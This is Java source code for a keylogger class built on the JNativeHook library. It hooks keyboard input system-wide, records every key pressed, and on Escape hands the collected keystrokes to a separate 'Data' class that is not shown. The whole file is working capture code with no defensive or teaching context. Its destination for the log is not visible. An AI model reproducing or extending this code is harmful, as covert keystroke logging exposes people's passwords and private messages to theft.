import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.util.concurrent.ExecutionException;

public class Logger implements NativeKeyListener {
    private String log;


    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key Pressed " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        log += NativeKeyEvent.getKeyText(e.getKeyCode());

        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                new Data(log);
            } catch (IOException | InterruptedException | ExecutionException ex) {
                ex.printStackTrace();
            }
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException ex) {
                ex.printStackTrace();
            }
        }
    }


    public void nativeKeyTyped(NativeKeyEvent e) {}

    public void nativeKeyReleased(NativeKeyEvent e) {
        if(e.getKeyCode() == 42) {
            log += "Shift Released";
        }
    }
}
